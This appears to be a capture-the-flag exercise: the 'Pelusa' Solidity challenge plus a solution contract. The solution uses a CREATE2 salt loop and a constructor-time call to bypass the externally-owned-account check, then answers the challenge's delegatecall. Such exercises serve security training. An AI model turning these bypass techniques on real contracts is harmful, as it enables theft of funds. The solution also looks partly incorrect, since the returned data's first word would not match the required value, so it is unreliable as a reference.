// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "Pelusa.sol";


contract factory{
    event deployed(address);

    function dep(uint _salt) public{
        Game _contract = new Game{salt: bytes32(_salt)}(address(0x2A250Fd8987ce00D20c728F2fA2492a70BF53672));
        emit deployed(address(_contract));
    }
}

contract Game{

    Pelusa p;
    address public a = address(uint160(uint256(keccak256(abi.encodePacked("0xac2d108a2c0cbb804383e04889bb2780eb936e65", blockhash(8367977))))));
    uint public da = 22_06_1986;

    constructor(address _a){
        p = Pelusa(_a);
        p.passTheBall();
    }

    function getBallPossesion() public view returns(address){
        return a;
    }

    function handOfGod() public view returns(bool, uint){
        return (true, da);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IGame {
    function getBallPossesion() external view returns (address);
}

// "el baile de la gambeta"
// https://www.youtube.com/watch?v=qzxn85zX2aE
// @author https://twitter.com/eugenioclrc
contract Pelusa {
    address private immutable owner;
    address internal player;
    uint256 public goals = 1;

    constructor() {
        owner = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))));
    }

    function passTheBall() external {
        require(msg.sender.code.length == 0, "Only EOA players");
        require(uint256(uint160(msg.sender)) % 100 == 10, "not allowed");

        player = msg.sender;
    }

    function isGoal() public view returns (bool) {
        // expect ball in owners posession
        return IGame(player).getBallPossesion() == owner;
    }

    function shoot() external {
        require(isGoal(), "missed");
				/// @dev use "the hand of god" trick
        (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature("handOfGod()"));
        require(success, "missed");
        require(uint256(bytes32(data)) == 22_06_1986);
    }
}